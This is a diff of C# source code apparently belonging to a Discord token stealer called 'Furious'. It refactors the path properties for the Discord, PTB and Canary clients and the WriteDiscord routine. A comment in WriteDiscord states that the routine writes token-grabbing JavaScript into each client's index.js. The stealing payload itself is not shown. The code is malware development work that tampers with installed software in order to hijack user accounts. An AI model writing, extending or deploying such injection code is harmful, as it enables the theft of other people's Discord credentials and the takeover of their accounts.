@@ -9,36 +9,27 @@ namespace Furious
 	{
 		internal static string PTBPath
 		{
-			get
-			{
-				return FileManagement._ptbpath;
-			}
+			get { return _ptbpath; }
 			set
 			{
-				FileManagement._ptbpath = value;
+				_ptbpath = value;
 			}
 		}
 		internal static string DiscordPath
 		{
-			get
-			{
-				return FileManagement._discordpath;
-			}
+			get { return _discordpath; }
 			set
 			{
-				FileManagement._discordpath = value;
+				_discordpath = value;
 			}
 		}
 
 		internal static string CanaryPath
 		{
-			get
-			{
-				return FileManagement._canarypath;
-			}
+			get { return _canarypath; }
 			set
 			{
-				FileManagement._canarypath = value;
+				_canarypath = value;
 			}
 		}
 
@@ -61,7 +52,7 @@ namespace Furious
 		internal static async Task WriteDiscord(string path)
 		{
 			///Writes the token grabbing JavaScript code into the Discord directory.
-			if (File.Exists(FileManagement.DiscordPath))
+			if (File.Exists(DiscordPath))
 			{
 				try
 				{
@@ -80,7 +71,7 @@ namespace Furious
 					Debug.WriteLine("Error writing to index.js in Discord path.");
 				}
 			}
-			if (File.Exists(FileManagement.PTBPath))
+			if (File.Exists(PTBPath))
 			{
 				try
 				{
@@ -99,7 +90,7 @@ namespace Furious
 					Debug.WriteLine("Error writing to index.js in DiscordPTB path.");
 				}
 			}
-			if (File.Exists(FileManagement.CanaryPath))
+			if (File.Exists(CanaryPath))
 			{
 				try
 				{
@@ -120,8 +111,8 @@ namespace Furious
 			}
 		}
 
-		private static string _ptbpath;
-		private static string _discordpath;
-		private static string _canarypath;
+		internal static string _ptbpath;
+		internal static string _discordpath;
+		internal static string _canarypath;
 	}
 }
